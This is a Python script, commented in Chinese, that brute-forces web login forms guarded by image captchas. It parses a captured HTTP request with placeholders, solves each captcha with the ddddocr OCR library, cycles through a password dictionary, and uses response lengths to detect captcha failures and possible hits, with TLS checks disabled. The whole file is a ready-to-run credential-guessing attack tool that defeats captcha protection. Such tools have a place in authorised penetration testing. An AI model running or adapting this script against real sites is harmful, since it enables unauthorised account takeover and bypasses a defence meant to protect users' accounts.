import sys

import argparse
import ddddocr
import requests
from urllib.parse import quote
# 网络请求使用的协议
protocol = "http://"
replaceCaptcha = "####"
replacePass = "****"
#解析http请求
#传入http数据包
#返回method,url,header,httpBody。GET请求的body为None
def prepareHttpRequestContent(content=""):
    content=content.replace("\r\n","\n")
    # 分离post请求的 header和body
    httpRequest = content.split("\n\n", 1)
    method = url = httpHead = httpBody = ""
    httpHeader = {}
    if len(httpRequest)==2:#post请求
        httpHead=httpRequest[0].split("\n")
        httpBody=httpRequest[1]
    else:#get请求
        httpHead=content.strip().split("\n")
    for i, line in enumerate(httpHead):
        if i == 0:  # 数据包首行
            tmp = line.split(" ")
            if len(tmp)!=3:
                print("数据包中的第一行错误")
                sys.exit(-1)
            method = tmp[0].lower()
            url=tmp[1]
        else:#解析http header
            tmp = line.split(":", 1)
            if len(tmp)!=2:
                print("数据包中的header错误")
                sys.exit(-1)
            httpHeader[tmp[0].lower().replace(" ", "")] = tmp[1].replace(" ", "")
    if "host" not in httpHeader:
        print("httpHeader中没有host")
        sys.exit(-1)
    url=protocol+httpHeader["host"]+url
    return method,url,httpHeader,httpBody


#获取并识别验证码
#返回识别后的验证码
def getCaptcha(method, url, header, data):
    try:
        if method=="post":
            resp = requests.post(url, headers=header, data=data, verify=False)
        else:
            resp = requests.get(url, headers=header, verify=False)
    except Exception as e:
        print("获取验证码失败，正在重试", e)
        return getCaptcha(method, url, header, data)
    try:
        captcha = ddddocr.DdddOcr().classification(resp.content)
    except Exception as e:
        print(e)
        sys.exit(-1)
    return captcha

#爆破的请求
#返回response header中的content-length
def passwordRequest(method, url, header, data):
    try:
        if method == "post":
            resp = requests.post(url, headers=header, data=data, verify=False)
        else:
            resp = requests.get(url, headers=header, verify=False)
    except Exception as e:
        print("爆破请求失败，正在重试",e)
        return passwordRequest(method, url, header, data)
    if "Content-Length" in resp.headers:
        return resp.headers["Content-Length"]
    else:
        return len(resp.content)

#联动验证码请求和爆破的请求
#返回conten-length和验证码
def prepareRequest(passwordRequestContent,captchaRequestContent, captchaErrorLength):
    #格式化验证码请求
    method, url, header, data = prepareHttpRequestContent(captchaRequestContent)
    #获取验证码
    captcha=getCaptcha(method, url, header, data)
    #将验证码替换到爆破的数据包中
    passwordTmpRequestContent = passwordRequestContent.replace(replaceCaptcha, captcha)
    #格式化爆破的数据包
    method, url, header, data = prepareHttpRequestContent(passwordTmpRequestContent)
    contentLength=passwordRequest(method, url, header, data)
    if int(contentLength)==int(captchaErrorLength):
        print("验证码识别错误，正在重试,{}".format(captcha))
        return prepareRequest(passwordRequestContent,captchaRequestContent, captchaErrorLength)
    return contentLength,captcha

#爆破数据包准备
def prepare(passwordRequestContent, password, captchaRequestContent, captchaErrorLength):
    passwordRequestContent = passwordRequestContent.replace("****", password)
    len,captcha = prepareRequest(passwordRequestContent, captchaRequestContent, captchaErrorLength)
    if int(len) <= 0:
        sys.exit(len)
    print("识别出来的验证码是：{0},爆破的密码为：{1},返回的长度为:{2}".format(captcha,quote(password), len))

# 读取文件，并爆破
def main(blastFile, captchaFile, passFile, errLen):
    if blastFile == None or captchaFile == None or passFile == None or errLen == None:
        print("python main.py -r blast.txt -c captcha.txt -d dict.txt -l 6335 -s True")
        sys.exit(-2)
    rfile = open(blastFile, "rb").read().decode("utf8")
    cfile = open(captchaFile, "rb").read().decode("utf8")
    pfile = open(passFile, "rb")
    pwds = pfile.readlines()
    for pwd in pwds:
        prepare(rfile, pwd.decode("utf8").strip(), cfile, errLen)


# 验证码位置####，爆破位置用****代替
if __name__ == '__main__':
    show = "爆破数据包中验证码使用####代替，爆破位置用****代替"
    parser = argparse.ArgumentParser(description=show)
    parser.add_argument('-r', help='爆破使用的数据包')
    parser.add_argument('-c', help='验证码使用的数据包')
    parser.add_argument('-d', help='字典文件')
    parser.add_argument('-l', help='验证码错误时返回的content-length')
    parser.add_argument('-s', help='是否使用https请求，默认使用http', type=bool)
    args = parser.parse_args()
    if args.s:
        protocol="https://"
    main(args.r, args.c, args.d, args.l)
